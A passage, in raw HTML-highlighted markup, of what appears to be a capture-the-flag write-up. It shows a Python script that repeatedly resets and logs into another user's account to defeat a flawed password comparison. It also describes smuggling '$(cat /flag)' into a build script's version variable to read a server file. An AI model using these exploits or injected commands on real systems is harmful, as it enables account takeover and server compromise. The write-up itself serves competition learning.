&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt; * @returns the user if one is found.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt; *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;async function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;getUserByUsernameAndPassword &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;  const &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;user &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= await getUserByUsername&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;undefined
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  const &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;hashedPassword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;crypto&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;createHash&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;sha1&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;update&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;digest&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;base64&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;!safeEqual&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;hashedPassword&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;hashedPassword&lt;&#x2F;span&gt;&lt;span&gt;)) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;undefined
&lt;&#x2F;span&gt;&lt;span&gt;  
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;user
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The vulnerability is that it is not comparing the password characters, or indexes of characters. For &lt;code&gt;i&lt;&#x2F;code&gt; from 0 to the length of the user&#x27;s hashed password,  it checks that the index of digit &lt;code&gt;i&lt;&#x2F;code&gt; is the same in the hashed password and the hash of the entered password.
We can also reset &lt;code&gt;tin&lt;&#x2F;code&gt;&#x27;s password using &lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;js&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-js &quot;&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;&#x2F;**
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt; * Resets the password given the username.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt; * @param {string} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;username
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt; * @returns a boolean indicating if the reset is successful
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt; *&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;async function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;resetPasswordByUsername &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;  const &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;user &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= await getUserByUsername&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;false
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;&#x2F;&#x2F; we don&amp;#39;t allow admins to reset passwords
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;!!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;isAdmin&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;false
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  const &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;crypto&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;randomBytes&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;toString&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;hex&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;  const &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;hashedPassword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;crypto&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;createHash&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;sha1&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;update&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;digest&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;base64&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;  
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;hashedPassword &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;hashedPassword
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;true
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Thus, we simply need to create a password, that, after being converted to hex, hashed with SHA1 and then encoded with base64, doesn&#x27;t contain digits 0 to 16 in the base64 encoded string.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;hashlib
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;base64 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;b64encode
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;os
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;random
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;string
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    data &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;(random.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;choices&lt;&#x2F;span&gt;&lt;span&gt;(string.ascii_letters &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;string.digits, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;k&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;    m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;hashlib.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;sha1&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    m.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;update&lt;&#x2F;span&gt;&lt;span&gt;(data.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;    password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;b64encode&lt;&#x2F;span&gt;&lt;span&gt;(m.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;digest&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(password)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(data)
&lt;&#x2F;span&gt;&lt;span&gt;    match &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c1bb71;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(i) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;)]:
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;t.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;password:
&lt;&#x2F;span&gt;&lt;span&gt;	    match &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;True
&lt;&#x2F;span&gt;&lt;span&gt;	    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;if not &lt;&#x2F;span&gt;&lt;span&gt;match:
&lt;&#x2F;span&gt;&lt;span&gt;	    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Using the following script, we obtain the password &lt;code&gt;JqPzxTR4xZmQkqdR&lt;&#x2F;code&gt;. We can now keep resetting the password until the password turns out to be a base64 with no digits. Only 10 of the 64 possible base64 characters are digits, so this doesn&#x27;t take too long.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;requests
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;hashlib
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;login &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;http:&#x2F;&#x2F;vrp-website-web.h4ck.ctfcompetition.com&#x2F;login&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;reset &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;http:&#x2F;&#x2F;vrp-website-web.h4ck.ctfcompetition.com&#x2F;reset-password&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;data &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;username&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;tin&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;password&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;JqPzxTR4xZmQkqdR&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;rdata &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;username&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;tin&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#64be81;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(i)
&lt;&#x2F;span&gt;&lt;span&gt;    r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;requests.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;post&lt;&#x2F;span&gt;&lt;span&gt;(login, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;data&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;data)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;Incorrect credentials&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;not in &lt;&#x2F;span&gt;&lt;span&gt;r.text:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(r.text)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;output.html&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;w&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;f:
&lt;&#x2F;span&gt;&lt;span&gt;            f.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(r.text)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(r.headers)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;    r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;requests.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;post&lt;&#x2F;span&gt;&lt;span&gt;(reset, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;data&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;rdata)
&lt;&#x2F;span&gt;&lt;span&gt;    i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#6facbe;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;With this exploit script, we can reset the password until our password satisfies the check done by &lt;code&gt;safeEqual()&lt;&#x2F;code&gt;. We log in as tin and obtain the flag.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ep004ch03&quot;&gt;EP004CH03&lt;&#x2F;h2&gt;
&lt;p&gt;The repository has something called pre-submit checks that can be ran with &lt;code&gt;git push --push-option=presubmit&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#181818;color:#c4c4c4;&quot;&gt;&lt;code&gt;&lt;span&gt;remote: Starting presubmit check
&lt;&#x2F;span&gt;&lt;span&gt;remote: Cloning into &amp;#39;tmprepo&amp;#39;...
&lt;&#x2F;span&gt;&lt;span&gt;remote: done.
&lt;&#x2F;span&gt;&lt;span&gt;remote: HEAD is now at 5d870ec test
&lt;&#x2F;span&gt;&lt;span&gt;remote: Building version v0.1.1
&lt;&#x2F;span&gt;&lt;span&gt;remote: .&#x2F;build.sh: line 5: go: command not found
&lt;&#x2F;span&gt;&lt;span&gt;remote: Build server must be misconfigured again...
&lt;&#x2F;span&gt;&lt;span&gt;remote: Thank you for your interest, but we are no longer accepting proposals
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Hmm, interesting, the version comes from the file &lt;code&gt;configure_flags.sh&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#181818;color:#c4c4c4;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;#!&#x2F;usr&#x2F;bin&#x2F;env bash
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#6a6a6a;&quot;&gt;# IMPORTANT: Make sure to bump this before pushing a new binary.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;VERSION&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;v0.1.1&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;COMMIT_HASH&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;$(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;git&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt; rev-parse --short HEAD)&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;BUILD_TIMESTAMP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;$(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;date &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;#39;+%Y-%m-%dT%H:%M:%S&amp;#39;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;LDFLAGS&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ca7473;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;-X &amp;#39;main.Version=${&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;VERSION&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;}&amp;#39;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;-X &amp;#39;main.CommitHash=${&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;COMMIT_HASH&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;}&amp;#39;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;&amp;quot;-X &amp;#39;main.BuildTime=${&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b678a9;&quot;&gt;BUILD_TIMESTAMP&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c59c70;&quot;&gt;}&amp;#39;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;If we change &lt;code&gt;VERSION&lt;&#x2F;code&gt; to &lt;code&gt;$(cat &#x2F;flag)&lt;&#x2F;code&gt; and push, we obtain the flag.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ep005ch01&quot;&gt;EP005CH01&lt;&#x2F;h2&gt;
